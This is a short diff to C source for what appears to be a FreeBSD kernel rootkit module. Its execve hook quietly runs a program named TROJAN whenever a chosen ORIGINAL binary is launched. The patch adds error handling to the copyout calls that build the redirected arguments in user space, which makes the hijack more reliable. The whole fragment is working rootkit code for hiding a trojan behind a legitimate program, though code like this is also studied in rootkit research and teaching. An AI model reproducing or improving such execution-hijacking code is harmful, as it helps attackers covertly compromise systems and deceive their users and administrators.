@@ -90,6 +90,7 @@ execve_hook(struct thread *td, void *syscall_args)
 	struct vmspace *vm;
 	vm_offset_t base, addr;
 	char t_fname[] = TROJAN;
+	int error;
 
 	/* Redirect this process? */
 	if (strcmp(uap->fname, ORIGINAL) == 0) {
@@ -116,14 +117,18 @@ execve_hook(struct thread *td, void *syscall_args)
 		 * in user space, you'll have to place any new "arrays" that
 		 * this structure points to in user space as well.
 		 */
-		copyout(&t_fname, (char *)addr, strlen(t_fname));
+		error = copyout(&t_fname, (char *)addr, strlen(t_fname));
+		if (error)
+			return(error);
 		kernel_ea.fname = (char *)addr;
 		kernel_ea.argv = uap->argv;
 		kernel_ea.envv = uap->envv;
 
 		/* Copy out the TROJAN execve_args structure. */
 		user_ea = (struct execve_args *)addr + sizeof(t_fname);
-		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+		error = copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+		if (error)
+			return(error);
 
 		/* Execute TROJAN. */
 		return(sys_execve(curthread, user_ea));
